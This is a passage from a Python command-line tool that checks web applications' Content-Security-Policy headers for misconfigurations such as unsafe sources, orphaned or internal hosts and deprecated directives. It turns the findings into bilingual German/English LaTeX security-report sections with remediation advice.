            r"aufgelöst werden konnten bzw. auf interne, nicht öffentlich erreichbare Adressen verweisen "
            r"($INTERNAL). Dabei handelt es sich typischerweise um Systeme aus dem internen Netz, die in eine "
            r"öffentlich ausgelieferte Richtlinie übernommen wurden. Da die CSP an jeden Besucher der Anwendung "
            r"ausgeliefert wird, gibt sie auf diese Weise interne Hostnamen, Namenskonventionen und Teile der "
            r"internen Netzstruktur preis. Diese Informationen erleichtern einem Angreifer die Vorbereitung "
            r"weiterer Angriffe. Zudem greifen die betroffenen Einträge für externe Nutzer ohnehin nicht. Es wird "
            r"empfohlen, interne Hosts aus der öffentlich ausgelieferten CSP zu entfernen und interne sowie externe "
            r"Richtlinien getrennt zu pflegen."
        )
        en_internal = Template(
            r"The CSP allowlists hosts that could not be resolved via public DNS servers, or that point to internal "
            r"addresses which are not publicly routable ($INTERNAL). These are typically systems from the internal "
            r"network that were carried over into a policy served publicly. Because the CSP is delivered to every "
            r"visitor of the application, it discloses internal host names, naming conventions and parts of the "
            r"internal network structure. This information makes it easier for an attacker to prepare further "
            r"attacks. In addition, the affected entries have no effect for external users in the first place. It "
            r"is recommended to remove internal hosts from the publicly served CSP and to maintain internal and "
            r"external policies separately."
        )
        de_unknown = Template(
            r"In der CSP werden Direktiven verwendet, die im Standard nicht definiert sind ($UNKNOWN). "
            r"Browser ignorieren unbekannte Direktiven vollständig. Handelt es sich um einen Schreibfehler, "
            r"greift die beabsichtigte Einschränkung für den betroffenen Ressourcentyp nicht, ohne dass dies "
            r"im laufenden Betrieb auffällt. Es wird empfohlen, die Schreibweise der betroffenen Direktiven zu "
            r"prüfen und zu korrigieren."
        )
        en_unknown = Template(
            r"The CSP uses directives that the standard does not define ($UNKNOWN). Browsers ignore unknown "
            r"directives entirely. If the name is a typo, the intended restriction for the affected resource "
            r"type does not apply at all, and nothing in normal operation reveals this. It is recommended to "
            r"check the spelling of the affected directives and to correct it."
        )
        de_deprecated = Template(
            r"Die CSP verwendet veraltete bzw. nicht mehr standardisierte Direktiven ($DEPRECATED). Diese werden von "
            r"modernen Browsern teilweise ignoriert oder wurden durch neuere Direktiven ersetzt, sodass die "
            r"beabsichtigte Einschränkung möglicherweise nicht oder nicht wie erwartet greift. Es wird empfohlen, "
            r"die veralteten Direktiven durch ihre aktuellen Entsprechungen zu ersetzen -- etwa \texttt{report-to} "
            r"anstelle von \texttt{report-uri} oder \texttt{frame-src} und \texttt{worker-src} anstelle von "
            r"\texttt{child-src}."
        )
        en_deprecated = Template(
            r"The CSP uses deprecated or non-standardised directives ($DEPRECATED). These are partly ignored by "
            r"modern browsers or have been superseded by newer directives, so the intended restriction may not take "
            r"effect or may not behave as expected. It is recommended to replace the deprecated directives with "
            r"their current equivalents -- for example \texttt{report-to} instead of \texttt{report-uri}, or "
            r"\texttt{frame-src} and \texttt{worker-src} instead of \texttt{child-src}."
        )

        # Put every sentence on its own line (LaTeX semantic line breaks). The
        # split happens at a sentence-final '.', '!' or '?' followed by spaces
        # and a capital letter, so abbreviations like "bzw." (lowercase next)
        # and dotted domains stay intact.
        def one_per_line(text: str) -> str:
            return re.sub(r"(?<=[.!?]) +(?=[A-ZÄÖÜ])", "\n", text)

        sections: List[str] = []
        if catchall:
            sections.append(one_per_line((de_catchall if de else en_catchall).substitute(CATCHALL=tt(catchall))))
        if bypasses:
            sections.append(one_per_line((de_bypass if de else en_bypass).substitute(BYPASS=tt(bypasses))))
        if orphans:
            sections.append(one_per_line((de_orphan if de else en_orphan).substitute(ORPHAN=tt(orphans))))
        if internal_hosts:
            sections.append(one_per_line((de_internal if de else en_internal).substitute(INTERNAL=tt(internal_hosts))))
        if unknown:
            sections.append(one_per_line((de_unknown if de else en_unknown).substitute(UNKNOWN=tt(unknown))))
        if deprecated:
            sections.append(
                one_per_line((de_deprecated if de else en_deprecated).substitute(DEPRECATED=tt(deprecated)))
            )

        return "\n\n".join(sections)

    def _block_no_csp(self, plural: bool = False) -> str:
        if self.lang == "de":
            de_template = Template(
                r"""
\section{Content Security Policy}
\finding[status=Open]
{L}
{Content Security Policy}
{$FINDING_SUMMARY}
{Restriktive Content Security Policy konfigurieren}

Für $APP_FUER, die einen zusätzlichen Schutz gegen Cross-Site Scripting (XSS)-Angriffe bieten $KONJUNKTIV1.

Eine CSP ist ein zusätzliches Sicherheitsfeature, welches der Server über den \texttt{Content-Security-Policy}-HTTP-Header setzen kann, um dem Browser mitzuteilen, von welchen Quellen bestimmte Ressourcen geladen werden dürfen.
Abhängig vom Typ der Ressource, wie Skripte, Stylesheets, Grafiken etc. können verschiedene Einschränkungen konfiguriert werden, etwa von welchen Servern Dateien nachgeladen werden dürfen und ob Inline-Code erlaubt ist.
Wenn die CSP restriktiv konfiguriert ist, dient sie als zusätzlicher Schutz und hilft dabei, bestimmte Angriffe, insbesondere XSS, zu verhindern, da der Browser den injizierten Schadcode nicht laden und ausführen dürfte.

$CURRENT_STATE

Es sollte geprüft werden, ob eine restriktive CSP für $WEBAPP konfiguriert werden kann.
Dabei muss bedacht werden, dass dies Änderungen am Applikationscode erfordern kann, beispielsweise weil Inline-JavaScript-Code in dedizierte Dateien verschoben werden muss.
Bei Produkten eines anderen Herstellers sind solche Änderungen in der Regel nur von diesem sinnvoll durchführbar.

Es ist auch möglich, inkrementell auf eine effektive CSP hinzuarbeiten, indem bei mehreren Entwicklungsiterationen sukzessive striktere Regeln konfiguriert werden.
Eine CSP kann auch in einem \enquote{report-only}-Modus genutzt werden, bei dem Verstöße zunächst protokolliert, aber noch nicht blockiert werden.

Weitere Informationen können dem CSP-Artikel in den MDN Web Docs entnommen werden.\footnote{Content Security Policy: \url{https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP}}
Während der Entwicklung ist auch das Online-Werkzeug \enquote{CSP Evaluator}\footnote{CSP Evaluator: \url{https://csp-evaluator.withgoogle.com/}} hilfreich, mit dem sich die Probleme einer gegebenen CSP identifizieren lassen.
""".strip()
            )

            app_nom = "Die Webanwendung" if not plural else "Die Webanwendungen"
            finding_summary = (
                f"{app_nom} {'wird' if not plural else 'werden'} nicht durch {'eine Content Security Policy' if not plural else 'Content Security Policies'} geschützt, "
                f"die bspw. Cross-Site Scripting-Angriffe verhindern {'kann' if not plural else 'können'}"
            )
            app_fuer = (
                "die Webanwendung wird keine Content Security Policy (CSP) gesetzt"
                if not plural
                else "die untersuchten Webanwendungen werden keine Content Security Policies (CSP) gesetzt"
            )
            konjunktiv1 = "würde" if not plural else "würden"
            current_state = (
                "Derzeit wird jedoch keine CSP vom Server gesetzt."
                if not plural
                else "Derzeit setzt jedoch keiner der untersuchten Webserver eine CSP."
            )
            webapp = "die Webanwendung" if not plural else "die Webanwendungen"

            return de_template.substitute(
                FINDING_SUMMARY=finding_summary,
                APP_FUER=app_fuer,
                KONJUNKTIV1=konjunktiv1,
                CURRENT_STATE=current_state,
                WEBAPP=webapp,
            )

        else:
            en_template = Template(
                r"""
\section{Content Security Policy}
\finding[status=Open]
{L}
{Content Security Policy}
{$FINDING_SUMMARY}
{Configure restrictive content security policy}

No Content Security Policy (CSP) is set for $APP_FOR, which would provide additional protection against cross-site scripting (XSS) attacks.

A CSP is an additional security feature that the server can set via the \texttt{Content-Security-Policy} HTTP header to tell the browser from which sources certain resources may be loaded.
Depending on the type of resource, such as scripts, stylesheets, graphics, etc., various restrictions can be configured, such as from which servers files may be loaded and whether inline code is permitted.
If the CSP is configured restrictively, it serves as additional protection and helps to prevent certain attacks, especially XSS, as the browser is not allowed to load and execute the injected malicious code.

$CURRENT_STATE

It should be checked whether $SIN_PLU_CSP can be configured for $APP_FOR.
It must be borne in mind that this may require changes to the application code, for example because inline JavaScript code must be moved to dedicated files.
In the case of products from another manufacturer, such changes can usually only be made by that manufacturer.

It is also possible to work incrementally towards an effective CSP by configuring successively stricter rules for several development iterations.
A CSP can also be used in a \enquote{report-only} mode, in which violations are initially logged but not yet blocked.

Further information can be found in the CSP article in the MDN Web Docs.\footnote{Content Security Policy: \url{https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP}}
During development, the online tool \enquote{CSP Evaluator}\footnote{CSP Evaluator: \url{https://csp-evaluator.withgoogle.com/}}, which can be used to identify the problems of a given CSP, is also helpful.
""".strip()
            )

            app_nom = "The web application" if not plural else "The web applications"
            finding_summary = (
                f"{app_nom} {'is' if not plural else 'are'} not protected by a content security policy that can, "
                f"for example, prevent cross-site scripting attacks"
            )
            app_for = "the web application" if not plural else "the web applications"
            current_state = (
                "However, no CSP is currently set by the server."
                if not plural
                else "However, no CSPs are set by the examined servers."
            )
            sin_plu_csp = "a restrictive CSP" if not plural else "restrictive CSPs"

            return en_template.substitute(
                FINDING_SUMMARY=finding_summary,
                APP_FOR=app_for,
                CURRENT_STATE=current_state,
                SIN_PLU_CSP=sin_plu_csp,
            )

    def render_many(self, results: List[URLResult]) -> str:
        provide_flash = r"\providecommand{\flash}{\syred{\faFlash}}"
        unreachable_note = self._unreachable_comment(results)
        reached = [r for r in results if not r.unreachable]

        # Nothing was tested, so there is no finding to make.
        if not reached:
            return unreachable_note.lstrip("\n")

        if len(results) == 1:
            res = results[0]
            if not has_effective_csp(res):
                return self._block_no_csp() + self._legacy_header_comment([res])

            formatted = pretty_csp(res.csp_raw)
            formatted = highlight_csp_problems(formatted, res)
            problems = "{" + ",".join(self._problems_list(res)) + "}"
            block = rf"""
\begin{{sydeflisting}}{{csplisting}}
{formatted}
\end{{sydeflisting}}
\baustein[%
    findingattribute={{%
        %prefix={{}},
    }},
    einstufung=I,
    csplisting=csplisting,
    probleme={problems}, % Options: missing-directive,unsafe,no-https,all-origins,data,bypass,no-report
]
{{csp}}
""".strip()
            parts = [provide_flash, block]
            extra = self._extra_sections([res])
            if extra:
                parts.append(extra)
            comment = self._findings_comment([res])
            if comment:
                parts.append(comment)
            return "\n\n".join(parts)

        if all(not has_effective_csp(r) for r in reached):
            # Only the hosts that answered are described by the finding, so a
            # single reachable host among unreachable ones stays singular.
            return self._block_no_csp(plural=len(reached) > 1) + self._legacy_header_comment(results) + unreachable_note

        seen_problems = {p for r in results if has_effective_csp(r) for p in self._problems_list(r)}
        cumulative: List[str] = [p for p in PROBLEM_ORDER if p in seen_problems]

        problems_braced = "{" + ",".join(cumulative) + "}"

        template_block = rf"""
\begin{{sydeflisting}}{{csplisting}}
§R[TODO: Diesen Teil im Bausteintext per lokalem Baustein entfernen!]R§
\end{{sydeflisting}}
\baustein[%
    findingattribute={{%
        %prefix={{}},
    }},
    einstufung=I,
    csplisting=csplisting,
    probleme={problems_braced}, % Options: missing-directive,unsafe,no-https,all-origins,data,bypass,no-report
]
{{csp}}
""".strip()

        titles = COLUMN_TITLES[self.lang]
        columns = cumulative + ["no-csp"]
        if len(reached) != len(results):
            columns.append("not-reachable")
        header_titles = ["URL"] + [titles[c] for c in columns]
        col_spec = "l" + ("-c" * len(columns))

        lines: List[str] = []
        lines.append(
            f"{r'\vref{tab:csp_config} gibt eine Übersicht über Fehlkonfigurationen der CSPs.' if self.lang == 'de' else r'\vref{tab:csp_config} provides an overview of CSP misconfigurations.'}"
        )
        lines.append("")
        lines.append(
            rf"\begin{{sytable}}[{'CSP Fehlkonfigurationen' if self.lang == 'de' else 'CSP misconfigurations'}\label{{tab:csp_config}}]{{"
            + col_spec
            + f"}}{{{' & '.join(header_titles)}}}"
        )

        for r in results:
            if r.unreachable:
                marked = {"not-reachable"}
            elif not has_effective_csp(r):
                marked = {"no-csp"}
            else:
                marked = set(self._problems_list(r))
            row_cells = [rf"\texttt{{{latex_escape(r.requested_url)}}}"]
            row_cells += [r"\flash" if c in marked else "" for c in columns]
            lines.append(" & ".join(row_cells) + r" \\")
        lines.append(r"\end{sytable}")

        table_block = "\n".join(lines)

        parts = [provide_flash, template_block, table_block]
        extra = self._extra_sections(results)
        if extra:
            parts.append(extra)
        comment = self._findings_comment(results)
        if comment:
            parts.append(comment)
        return "\n\n".join(parts) + unreachable_note


# ---------------------------------------
# CLI
# ---------------------------------------


def read_csp_with_rich(*, sentinel: str = "EOF") -> Optional[str]:
    """
    Show a Rich-styled prompt that lets the user paste a CSP.
    """
    console = Console(stderr=True)
    console.print(
        Panel.fit(
            Text.from_markup(
                "[b]Interactive CSP Input[/]\n"
                "Paste your Content-Security-Policy below.\n\n"
                f"• End input with a line containing only [b]{sentinel}[/]\n"
                "• Or send end-of-file: Ctrl-D (macOS/Linux) or Ctrl-Z then Enter (Windows)\n\n"
                "Example:\n"
                "  default-src 'self'; script-src 'self' https://cdn.example.com;\n"
                f"  [i]{sentinel}[/]\n"
            ),
            title="CSP Parser",
            border_style="cyan",
        )
    )

    lines: list[str] = []
    try:
        while True:
            try:
                line = input()
            except EOFError:
                break
            if line.strip() == sentinel:
                break
            lines.append(line)
    except KeyboardInterrupt:
        console.print("\n[dim]Aborted by user.[/]")
        return None

    csp = "\n".join(lines).strip()
    if not csp:
        console.print("[red]No CSP provided.[/]")
        return None
    return csp


def emit_results(results: List[URLResult], *, fmt: str, output: Optional[str], lang: str) -> None:
    """Render `results` in `fmt` and either write them to `output` or print
    them. Used by every input mode so that --format/--output behave the same
    whether the CSP was fetched or pasted."""
    if fmt == "json":
        renderer: BaseRenderer = JsonRenderer()
    elif fmt == "latex":
        renderer = LatexRenderer(lang=lang)
    elif fmt == "raw":
        renderer = RawRenderer()
    else:
        renderer = TextRenderer(console=None)

    if output:
        try:
            content = renderer.render_many(results)
            with open(output, "w", encoding="utf-8") as fh:
                fh.write(content)
        except OSError as e:
            console.print(f"[red]Failed to write output:[/red] {e}")
            sys.exit(3)
        console.print(f"[green]Wrote output to[/green] {output}")
        return

    if fmt == "text":
        TextRenderer(console=console).print_to_console(results)
    else:
        print(renderer.render_many(results))


@click.command(context_settings={"help_option_names": ["-h", "--help"]})
@click.option("-u", "--url", default=None, help="Single URL/domain to check.")
@click.option("-f", "--file", "file_path", default=None, help="Path to a file with one URL per line.")
@click.option("--csp", is_flag=True, default=False, help="Open an interactive input to paste a CSP and parse it.")
@click.option("-c", "--cookies", default=None, help="Semicolon-separated cookies: 'a=b; c=d'")
@click.option("-H", "--headers", default=None, help="Semicolon-separated headers: 'X-Token: abc; Accept: text/html'")
@click.option(
    "-o",
    "--output",
    default=None,
    help="Write results to this file. If omitted, prints to console (unless --format=latex).",
)
@click.option(
    "--format",
    "fmt",
    type=click.Choice(["text", "raw", "json", "latex"]),
    default="text",
    show_default=True,
    help="Output format.",
)
@click.option("-l", "--lang", default="de", show_default=True, help="Language for LaTeX output (de|en|german|english).")
@click.option(
    "--proxy", default=None, help="Comma-separated list of proxy URLs, e.g. 'http://127.0.0.1:8080,https://proxy2:443'."
)
@click.option(
    "-A",
    "--user-agent",
    default=DEFAULT_USER_AGENT,
    help="User-Agent to send. Some sites vary the policy by client.",
)
@click.option("--insecure", is_flag=True, default=False, help="Disable SSL certificate verification.")
@click.option("-r", "--redirect", is_flag=True, default=False, help="Allows redirects.")
@click.option(
    "-t",
    "--threads",
    default=20,
    show_default=True,
    type=click.IntRange(min=1),
    help="Max concurrent requests when fetching multiple URLs.",
)
@click.option(
    "--retries",
    default=2,
    show_default=True,
    type=click.IntRange(min=0),
    help="Number of retry attempts for transient network errors.",
)
@click.option(
    "--timeout",
    default=15.0,
    show_default=True,
    type=click.FloatRange(min=0, min_open=True),
    help="Per-request timeout in seconds.",
)
@click.option(
    "--check-orphans",
    is_flag=True,
    default=False,
    help="Resolve allowlisted domains via DNS/WHOIS and flag orphaned (unregistered, attacker-claimable) ones.",
)
@click.option(
    "--check-hosts",
    is_flag=True,
    default=False,
    help="Resolve every host in the CSP via DNS and flag internal / non-publicly-resolving ones.",
)
@click.option(
    "--dns-resolvers",
    default="8.8.8.8,1.1.1.1",
    show_default=True,
    help="Comma-separated DNS resolvers used for --check-orphans/--check-hosts, tried in order.",
)
@click.option(
    "--dns-timeout",
    default=3.0,
    show_default=True,
    type=click.FloatRange(min=0, min_open=True),
    help="Per-lookup DNS resolve timeout in seconds for --check-orphans/--check-hosts.",
)
def main(
    url,
    file_path,
    csp,
    cookies,
    headers,
    output,
    fmt,
    lang,
    proxy,
    user_agent,
    insecure,
    redirect,
    threads,
    retries,
    timeout,
    check_orphans,
    check_hosts,
    dns_resolvers,
    dns_timeout,
):
    """Inspect the Content-Security-Policy header for one or many URLs.

    \b
    Examples:
      csp-check -u https://example.com
      csp-check -f urls.txt
      csp-check -u example.com -o results.txt
      csp-check -u example.com -o results.json --format json
      csp-check -u example.com -o results.tex --format latex --lang de
    """
    sources = sum([bool(url), bool(file_path), bool(csp)])
    if sources == 0:
        raise click.UsageError("One of --url, --file, or --csp is required.")
    if sources > 1:
        raise click.UsageError("--url, --file, and --csp are mutually exclusive.")

    cookies_dict = parse_cookies(cookies)
    extra_headers = parse_headers(headers)

    resolver_list = [r.strip() for r in dns_resolvers.split(",") if r.strip()]

    if csp:
        csp_text = read_csp_with_rich()
        if csp_text is None:
            sys.exit(-1)
        result = parse_csp(csp_text, "<stdin>", "<stdin>")
        if check_orphans:
            asyncio.run(
                annotate_orphans([result], dns_resolvers=resolver_list, concurrency=threads, dns_timeout=dns_timeout)
            )
        if check_hosts:
            asyncio.run(
                annotate_internal_hosts(
                    [result], dns_resolvers=resolver_list, concurrency=threads, dns_timeout=dns_timeout
                )
            )
        emit_results([result], fmt=fmt, output=output, lang=lang)
        return

    if url:
        urls = [url]
    else:
        try:
            urls = read_urls_from_file(file_path)
        except Exception as e:
            console.print(f"[red]Failed to read file:[/red] {e}")
            sys.exit(2)

    if fmt == "text" and not output and len(urls) > 1 and sys.stdin.isatty():
        if not click.confirm(f"Do you really want to print {len(urls)} results in your terminal?", default=True):
            console.print("Try one of the other output methods with --format [raw, json, latex]")
            sys.exit(1)

    proxies = normalize_proxy_list(proxy) if proxy else {}

    results: List[URLResult] = asyncio.run(
        fetch_multiple_csps(
            urls,
            cookies=cookies_dict,
            headers=extra_headers,
            proxies=proxies,
            is_secure=not insecure,
            redirect=redirect,
            concurrency=threads,
            timeout_s=timeout,
            max_retries=retries,
            user_agent=user_agent,
        )
    )

    if check_orphans:
        asyncio.run(
            annotate_orphans(results, dns_resolvers=resolver_list, concurrency=threads, dns_timeout=dns_timeout)
        )

    if check_hosts:
        asyncio.run(
            annotate_internal_hosts(results, dns_resolvers=resolver_list, concurrency=threads, dns_timeout=dns_timeout)
        )

    emit_results(results, fmt=fmt, output=output, lang=lang)


if __name__ == "__main__":
    main()
